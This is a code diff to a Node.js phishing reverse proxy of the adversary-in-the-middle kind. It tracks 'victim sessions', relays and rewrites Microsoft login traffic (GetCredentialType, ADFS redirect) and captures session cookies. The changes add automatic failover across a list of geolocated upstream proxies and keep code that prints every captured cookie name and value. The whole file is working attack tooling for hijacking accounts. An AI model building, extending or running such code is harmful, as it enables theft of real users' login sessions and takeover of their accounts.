@@ -384,19 +384,22 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 });
 proxyServer.listen(process.env.PORT ?? 3000);
 
-
-const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
-    // ========== NEW: Wait for geo & proxy list, select first (city-level if available) ==========
+const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest, proxyIndex = 0) => {
     if (VICTIM_SESSIONS[currentSession].geoPromise) {
         await VICTIM_SESSIONS[currentSession].geoPromise;
     }
-    if (!VICTIM_SESSIONS[currentSession].proxyAgent && VICTIM_SESSIONS[currentSession].proxyLevels?.length > 0) {
-        const firstProxy = VICTIM_SESSIONS[currentSession].proxyLevels[0];
-        console.log(`🌍 Using proxy (${firstProxy.level}): ${firstProxy.url}`);
-        VICTIM_SESSIONS[currentSession].proxyAgent = buildProxyAgentFromUrl(firstProxy.url);
+
+    const proxyLevels = VICTIM_SESSIONS[currentSession].proxyLevels || [];
+    if (proxyIndex >= proxyLevels.length) {
+        console.error(`❌ All proxies failed for session ${currentSession}`);
+        clientResponse.writeHead(502, { "Content-Type": "text/plain" });
+        clientResponse.end("All proxies failed");
+        return;
     }
-    const proxyAgent = VICTIM_SESSIONS[currentSession].proxyAgent;
-    // ========== END NEW ==========
+
+    const proxyEntry = proxyLevels[proxyIndex];
+    const proxyAgent = buildProxyAgentFromUrl(proxyEntry.url);
+    console.log(`🌍 Trying proxy [${proxyIndex + 1}/${proxyLevels.length}] (${proxyEntry.level}): ${proxyEntry.url}`);
 
     const isHttps = proxyRequestProtocol === "https:";
     const requestModule = isHttps ? https : http;
@@ -406,7 +409,6 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
     }
 
     const proxyRequest = requestModule.request(requestOptions, (proxyResponse) => {
-
         logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
             .catch(error => displayError("Log encryption failed", error));
 
@@ -439,13 +441,11 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
         if (proxyResponseCookie) {
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
 
-            // ===================== ADDED: PRINT ALL COOKIES TO CONSOLE =====================
             console.log(`[COOKIES] Session: ${currentSession}`);
             for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
                 const expiresStr = isNaN(cookie.expires) ? 'session' : new Date(cookie.expires).toISOString();
                 console.log(`  ${cookie.name}=${cookie.value} (domain=${cookie.domain}, path=${cookie.path}, expires=${expiresStr})`);
             }
-            // ==============================================================================
         }
         proxyResponse.headers["cache-control"] = "no-store";
         proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
@@ -477,8 +477,6 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
                         displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                     }
                 }
-
-                // Modify the FederationRedirectUrl variable to proxify the cross-origin navigation request to the ADFS portal
                 else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                     try {
                         const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
@@ -499,12 +497,26 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
             });
     });
 
+    proxyRequest.on("error", (error) => {
+        console.error(`Proxy request failed (${proxyEntry.level}): ${error.message}`);
+        // Try next proxy in the list
+        makeProxyRequest(
+            proxyRequestProtocol,
+            proxyRequestOptions,
+            currentSession,
+            proxyHostname,
+            proxyRequestBody,
+            clientResponse,
+            isNavigationRequest,
+            proxyIndex + 1
+        ).catch(err => displayError("Proxy retry failed", err));
+    });
+
     if (proxyRequestBody) {
         proxyRequest.write(proxyRequestBody);
     }
     proxyRequest.end();
 };
-
 // ==================== REMAINING FUNCTIONS UNCHANGED ====================
 function displayError(message, error, ...args) {
     console.error("******************************");
